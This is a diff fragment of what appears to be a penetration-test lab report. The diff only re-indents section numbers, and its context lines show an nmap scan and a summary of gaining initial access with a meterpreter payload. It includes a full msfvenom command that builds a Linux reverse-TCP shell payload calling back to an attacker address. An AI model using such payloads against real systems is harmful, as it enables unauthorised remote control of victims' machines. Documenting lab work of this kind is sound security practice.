@@ -35,17 +35,17 @@ nmap -sS -sV 10.10.10.20
 
   INITIAL ACCESS AND EXECUTION
 
-1. Summary
+ 1. Summary
 Created a small Linux meterpreter ELF payload on attacker host, served it via HTTP server, fetched and executed it on the victim, then handled the incoming meterpreter session from Metasploit.
 
-2. Artifacts / screenshots
+ 2. Artifacts / screenshots
 -Payload creation: 'evidence/2025-10-27_15-32-08_Payload_Creation_Initial_Access_Execution.png'
 -Serving payload: 'evidence/2025-10-27_15-38-08_Serving_Payload_Initial_Access_Execution.png'
 -Payload downloaded on victim: 'evidence/2025-10-27_15-42-04_Payload_On_Victim_Initial_Access_Execution.png'
 -Exploit/run and handler: 'evidence/2025-10-27_15-47-45_Exploit_Run_And_Waiting_Initial_Access_Execution.png'
 -Successful execution(meterpreter/shell proof)- 'evidence/2025-10-27_15-58-31_Successful-Execution_Initial-Access-Execution.png'
 
-3. What I did
+ 3. What I did
 Generated a Linux ELF reverse-TCP payload on the attacker:
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -O shell32.elf
 
